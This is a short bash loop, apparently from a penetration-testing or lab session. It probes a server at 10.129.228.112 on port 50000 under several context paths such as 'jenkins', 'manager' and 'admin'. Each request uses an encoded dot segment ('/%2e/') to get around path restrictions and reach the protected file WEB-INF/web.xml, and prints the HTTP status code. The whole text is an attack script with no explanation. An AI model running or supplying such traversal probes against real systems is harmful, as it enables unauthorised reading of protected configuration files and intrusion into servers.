for context in "" "app" "jenkins" "manager" "admin"; do                                   
  echo "Testing: /$context"                                                               
  curl -s -o /dev/null -w "  Status: %{http_code}\n"                                      
"http://10.129.228.112:50000/$context/%2e/WEB-INF/web.xml"                                
done
